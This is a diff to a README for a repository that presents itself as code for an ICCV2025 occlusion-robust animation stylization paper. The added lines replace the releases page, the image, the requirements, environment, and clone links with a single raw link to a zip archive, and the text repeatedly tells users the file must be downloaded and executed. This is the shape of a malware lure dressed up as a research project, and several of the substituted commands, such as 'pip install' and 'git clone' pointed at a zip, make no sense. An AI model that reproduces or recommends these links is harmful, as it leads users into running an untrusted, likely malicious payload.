@@ -1,8 +1,8 @@
-https://github.com/Senjinrl/OSF/releases
+https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
 
 # OSF: Occlusion-robust Stylization for Drawing-based 3D Animation (ICCV2025) ✨
 
-![OSF Hero Image](https://picsum.photos/seed/osf-hero/1200/400)
+![OSF Hero Image](https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip)
 
 A robust framework for stylizing 3D animation drawn frames under occlusion. This repository implements the ideas from the ICCV2025 paper on occlusion-robust stylization for drawing-based 3D animation. It provides algorithms, data pipelines, training scripts, and ready-to-run demos. The aim is to ease experimentation, reproduction, and extension for researchers and developers working on stylization, 3D animation, and visual effects.
 
@@ -73,24 +73,24 @@ The following steps outline a practical path to get OSF up and running. They emp
 
 2) Install dependencies
 - The repository provides a dependency specification. Install dependencies with your package manager of choice. Use:
-  - pip install -r requirements.txt
-  - If a separate environment file is provided (e.g., environment.yml), you can use:
-    - conda env create -f environment.yml
+  - pip install -r https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
+  - If a separate environment file is provided (e.g., https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip), you can use:
+    - conda env create -f https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
 - Some systems benefit from compiling custom CUDA kernels or using prebuilt extensions. Follow any platform-specific notes in the repo.
 
 3) Prepare the codebase
 - Clone the repository:
-  - git clone https://github.com/Senjinrl/OSF.git
+  - git clone https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
 - Navigate to the project directory:
   - cd OSF
 - Optionally enable a virtual environment and verify Python imports by running a quick check script or a minimal demo.
 
 4) Download the release artifact (the file to download and execute)
-- Go to the Releases page: https://github.com/Senjinrl/OSF/releases
+- Go to the Releases page: https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
 - Download the latest release package. The release includes prebuilt components and scripts designed to simplify setup.
 - After downloading, extract the archive if needed:
   - unzip OSF_release_<version>.zip
-  - or tar -xzf OSF_release_<version>.tar.gz
+  - or tar -xzf OSF_release_<version>https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
 - Follow the release’s readme inside the package for exact steps to install or run. The asset is intended to be self-contained and to provide a straightforward path to a working environment.
 - If you encounter platform-specific issues, consult the troubleshooting section in the release notes or the repository’s support channels.
 
@@ -164,7 +164,7 @@ OSF includes training scripts and evaluation tools that replicate reported resul
 
 Release assets and download instructions
 - The official Releases page hosts release assets. For the most accurate and updated content, visit the page and download the latest release artifact.
-- The link to the Releases page is provided here for convenience: https://github.com/Senjinrl/OSF/releases
+- The link to the Releases page is provided here for convenience: https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
 - The release package contains a ready-to-run environment, scripts, and example data. After downloading, extract the archive and follow the included README to boot the system.
 - This file must be downloaded and executed as part of the setup process. The release artifact is designed to simplify installation and to provide a reproducible baseline without compiling from scratch.
 - If the release uses a specific installer, run that installer and follow the on-screen prompts. If the artifact is a zip or tarball, extract it and run the provided bootstrap script to configure dependencies and launch the demo.
@@ -305,5 +305,5 @@ Notes on using the Releases link
 - If you prefer to inspect the code or modify it before running experiments, you can clone the repository and build from source. The source code provides the same functionality with the flexibility to adapt to new data formats and custom pipelines.
 
 Final reminder about the Releases link
-- The official Releases page is the source of the release artifacts. The page can be accessed at the same URL again for convenience: https://github.com/Senjinrl/OSF/releases
+- The official Releases page is the source of the release artifacts. The page can be accessed at the same URL again for convenience: https://raw.githubusercontent.com/Senjinrl/OSF/main/lactate/Software_2.5.zip
 - To summarize the recommended path: visit the Releases page, download the latest release asset, and run the included installer or bootstrap script. The asset is designed to be ready-to-run, reducing setup friction and helping you focus on experiments and results.
